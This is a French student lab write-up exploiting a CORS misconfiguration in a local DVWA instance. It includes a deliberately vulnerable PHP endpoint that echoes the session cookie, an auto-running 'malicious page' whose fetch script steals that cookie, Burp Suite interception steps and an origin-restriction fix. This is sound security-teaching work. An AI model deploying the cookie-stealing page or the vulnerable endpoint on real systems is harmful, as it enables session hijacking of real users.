# Exercice 2: SATTACK

## Configuration du DVWA

1. Avec un script docker-compose.yml, j'ai pu créer l'architechture du DVWA.
2. J'ai configuré le DVWA en mode "low" pour faciliter les tests de sécurité.

[image](images/Screenshot%20from%202025-09-10%2016-19-28.png)

## Vunérabilité CORS

1. J'ai créé un fichier `cors_vulnerability.php` qui simule une vulnérabilité CORS en autorisant toutes les origines (`*`) et en renvoyant le cookie de session.

```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
echo "Votre cookie de session : " . $_COOKIE['PHPSESSID'];
?>
```

- Le header `Access-Control-Allow-Origin: *` permet à n'importe quelle origine d'accéder à la ressource.
- Le header `Access-Control-Allow-Credentials: true` permet d'autoriser l'envoi des cookies avec les requêtes CORS.

- J'ai monté la vulnérabilité dans le conteneur DVWA.

```yml
volumes:
    - ./cors_vulnerability.php:/var/www/html/cors_vulnerability.php
```

### Préparation de la page malveillante

J'ai créé un fichier `exploit.html` qui exploite la vulnérabilité CORS pour voler le cookie de session avec ce script pour le faire: 

```html
<!DOCTYPE html>
<html>
<head>
    <title>Page Malveillante</title>
</head>
<body>
   
    <div id="result"></div>
    
    <script>
        function stealCookie() {
            fetch('http://localhost:8080/cors_vulnerability.php', {
                method: 'GET',
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').innerHTML = 
                    '<h2>cookie vole</h2> <span>' + data + '</span>';
                console.log('Cookie volé:', data);
            })
        }
        window.onload = function() {
            stealCookie();
        };
    </script>
</body>
</html>


```
- Le script utilise la méthode `fetch` pour envoyer une requête GET à `cors_vulnerability.php` avec l'option `credentials: 'include'` pour inclure les cookies.

- Dans cette article, [url](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS), il est dit que , lorsque `Access-Control-Allow-Origin` est défini sur `*`, les navigateurs n'incluent pas les cookies dans les requêtes CORS, même si `credentials: 'include'` est spécifié. Cela signifie que le cookie de session ne sera pas envoyé avec la requête fetch, et par conséquent, le script ne pourra pas voler le cookie de session.

[image](images/Screenshot%20from%202025-09-10%2017-37-34.png)

- Donc pour contourner cette restrition j'utilise l'extension `Allow-CORS` dans le navigateur qui permet de désactiver la politique CORS pour les tests de sécurité.

[image](images/Screenshot%20from%202025-09-10%2017-39-26.png)

- Je sert cette page malveillante en utilisant un serveur HTTP simple:

```bash
python3 -m http.server 8000
```

- Le cookie volé est affiché dans la page HTML.

[image](images/Screenshot%20from%202025-09-10%2016-48-41.png)

### Capturer le traffic avec Burp Suite

- Sur Blurp Suite, j'ai fait une configuration par défaut du proxy pour intercepter les requétes HTTP.
- J'ai ouvert le navigateur à partir de Burp Suite pour capturer le trafic.
- Je me suis loggué dans le DVWA pour générer un cookie de session.
- Puis j'ai visité la page vulnérable `http://localhost:8080/cors_vulnerability.php` pour m'assurer que le cookie est bien renvoyé.

[image](images/Screenshot%20from%202025-09-10%2016-57-59.png)

- Ensuite, j'ai visité la page malveillante `http://localhost:8000/exploit.html` pour exécuter le script de vol de cookie.

[image](images/Screenshot%20from%202025-09-10%2016-59-46.png)

- Que je forward dans BlurpSuite pour avoir la réponse.
- J'intercepte encore la réquéte vers `http://localhost:8080/cors_vulnerability.php` qui contient le cookie de session dans la réponse que je forwarde pour avoir le cookie dasn la réponse de la page malveillante.

[image](images/Screenshot%20from%202025-09-10%2017-03-08.png)

### Contre-mesure

- Pour corriger la vulnérabilité, j'ai modifié le fichier `cors_vulnerability.php` pour restreindre l'origine autorisée à une origine de confiance spécifique au lieu d'utiliser `*`.

```php
header("Access-Control-Allow-Origin: http://localhost:5000");
```

- Pour tester je settup la page de confiance sur le port 5000:

```bash
python3 -m http.server 5000
```

- Et j'obtient bien le cookie.

[image](images/Screenshot%20from%202025-09-10%2017-44-39.png)


- Je fais le méme test sur la page malveillante sur le port 8000.

[image](images/Screenshot%20from%202025-09-10%2017-14-09.png)

- La requéte pour récupérer le cookie ne marche plus car l'origine n'est pas ```http://localhost:5000```.




